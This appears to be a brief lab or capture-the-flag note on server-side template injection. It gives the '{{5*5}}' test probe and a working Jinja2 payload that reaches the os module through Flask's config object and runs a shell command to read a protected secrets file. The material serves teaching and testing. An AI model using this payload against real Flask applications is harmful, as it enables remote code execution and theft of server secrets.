### Server Side Template Injection

---

Server side template injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server.
Example of a vulnerability : 

```py
{{5*5}}
```

Flask payload for Jinja2 : 

```py
{{config.__class__.__init__.__globals__['os'].popen('cat flaskr/protected/burdellsecrets.txt').read()}}
```

